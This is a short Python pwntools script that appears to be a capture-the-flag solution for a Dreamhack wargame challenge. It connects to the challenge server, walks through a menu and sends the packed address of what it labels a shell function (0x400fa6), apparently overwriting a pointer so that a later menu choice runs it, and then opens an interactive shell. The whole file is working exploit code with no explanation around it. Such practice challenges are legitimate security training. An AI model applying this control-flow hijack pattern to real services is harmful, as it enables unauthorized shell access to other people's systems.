from pwn import *

p = remote('host1.dreamhack.games', 20073)

p.recvrepeat(1)
p.sendline('1')
p.recvrepeat(1)
p.sendline('2')
p.recvrepeat(1)
p.sendline('3')
p.recvrepeat(1)
addr_shell = 0x400fa6
p.sendline(p64(addr_shell))
p.recvrepeat(1)
p.sendline('4')
p.recvrepeat(1)
p.sendline('2')
p.interactive()
